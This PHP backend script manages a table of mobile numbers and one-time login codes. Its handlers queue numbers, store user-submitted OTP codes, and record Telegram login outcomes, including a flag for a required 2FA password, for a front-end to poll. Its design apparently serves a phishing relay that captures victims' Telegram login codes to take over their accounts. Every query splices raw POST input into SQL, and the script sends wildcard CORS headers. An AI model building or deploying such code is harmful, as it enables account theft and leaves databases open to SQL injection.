<?php
include 'config.php';

header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Methods: POST");
header("Allow: GET, POST, OPTIONS, PUT, DELETE");
header("Access-Control-Allow-Headers: X-API-KEY, Origin, X-Requested-With, Content-Type, Accept, Access-Control-Request-Method, Access-Control-Allow-Origin");


if(isset($_POST['get_user_mob_number']))
{
    $mobile_numner = $_POST['user_id'];
    
    $selectc= "SELECT * from user_mobile_otp_get where mobile_number='$mobile_numner' && `status`='0' and `otp`='0' order by id asc limit 1";
    $row = $conn->query($selectc);
    if(mysqli_num_rows($row) > 0)
    {
        while($result = mysqli_fetch_assoc($row))
        {
            $mobile_number = $result['mobile_number'];
            $id = $result['id'];
            $update = "UPDATE user_mobile_otp_get SET `status`='1' where id='$id'";
            if(mysqli_query($conn,$update))
            {
                echo $mobile_number;
            }
         
        }
    
    }

    die();
}


if(isset($_POST['get_user_mob_number_with_otp']))
{
    $otp = 0;
    if(isset($_POST['mobile_number']) && $_POST['mobile_number'] != '')
    {
        $mobile_number = explode(' ',$_POST['mobile_number']);

        $mobile_number = $mobile_number[1];

        $country_code = trim($mobile_number[0]);
        
        $selectc= "SELECT * from user_mobile_otp_get where `mobile_number`='$mobile_number' && `otp`!='0'";
        $row = $conn->query($selectc);
        if(mysqli_num_rows($row) > 0)
        {
            while($result = mysqli_fetch_assoc($row))
            {
                $otp = $result['otp'];
            
              
            }
        
        }
    }

    echo $otp;

    die();
}

if(isset($_POST['send_telegram_code_status']))
{
    $status = 0;

    $mobile_number_data = explode(' ',$_POST['mobile_number']);

    print_r($mobile_number);
    $mobile_number = $mobile_number_data[1];
    $country_codehwe = str_replace("+","",$mobile_number_data[0]);
    $country_code = trim($country_codehwe);

    $code_status = $_POST['code_status'];
    $code_message = $_POST['code_message'];

 
    $selectc= "SELECT * from user_mobile_otp_get where mobile_number='$mobile_number' && country_code='$country_code' order by id asc limit 1";
    $row = $conn->query($selectc);

    if(mysqli_num_rows($row) > 0)
    {
        while($result = mysqli_fetch_assoc($row))
        {
            $id = $result['id'];
            $mobile_number = $result['mobile_number'];
            $update = "UPDATE user_mobile_otp_get SET `code_status`='$code_status',code_message='$code_message' where id='$id'";
            if(mysqli_query($conn,$update))
            {
                $status = 1;
            }
         
        }
    
    }
    echo $status;

    die();
}

if(isset($_POST['check_code_status']))
{
    $status = 0;

    $mobile_number = $_POST['mobile_number'];
    $country_code = $_POST['country_code'];

 
    $code_message = "";
    $selectc= "SELECT * from user_mobile_otp_get where mobile_number='$mobile_number' && country_code='$country_code' && code_message!='' && logined='0' order by id asc limit 1";
    $row = $conn->query($selectc);
    if(mysqli_num_rows($row) > 0)
    {
        while($result = mysqli_fetch_assoc($row))
        {
            
            $code_status = $result['code_status'];
            $code_message = $result['code_message'];
            $id = $result['id'];

            if($code_status == 1 && $code_message == "login Successfull")
            {
                $update = "UPDATE user_mobile_otp_get SET logined='1' where mobile_number='$mobile_number' && country_code='".$country_code."'";
                mysqli_query($conn,$update);
                
            }
            elseif($code_status == 0 && $code_message == 'SESSION_PASSWORD_NEEDED')
            {
                $update = "UPDATE user_mobile_otp_get SET code_message='',otp='0' where mobile_number='$mobile_number' && country_code='".$country_code."'";
                mysqli_query($conn,$update);
                $code_message = 'SESSION_PASSWORD_NEEDED';
            }
            elseif($code_status == 0 && $code_message != '')
            {
                $update = "UPDATE user_mobile_otp_get SET code_message='',otp='0' where mobile_number='$mobile_number' && country_code='".$country_code."'";
                mysqli_query($conn,$update);
            }
            
           
        }
    
    }
   
    echo $code_message;

    die();
}

if(isset($_POST['save_code_custom_form']))
{
    $response =0;
    $mobile_number = $_POST['mobile_number'];
    $country_code = $_POST['country_code'];
    
    $otp = $_POST['otp_code'];

    $select = "SELECT * from user_mobile_otp_get where mobile_number='$mobile_number' && country_code='".$country_code."'";
    $row = $conn->query($select);
    if(mysqli_num_rows($row) > 0)
    {

        $update = "UPDATE user_mobile_otp_get SET otp='$otp' where mobile_number='$mobile_number' && country_code='".$country_code."'";
        if(mysqli_query($conn,$update))
        {
           $response = 1;
        }
    }
    echo $response;
    die();
}

?>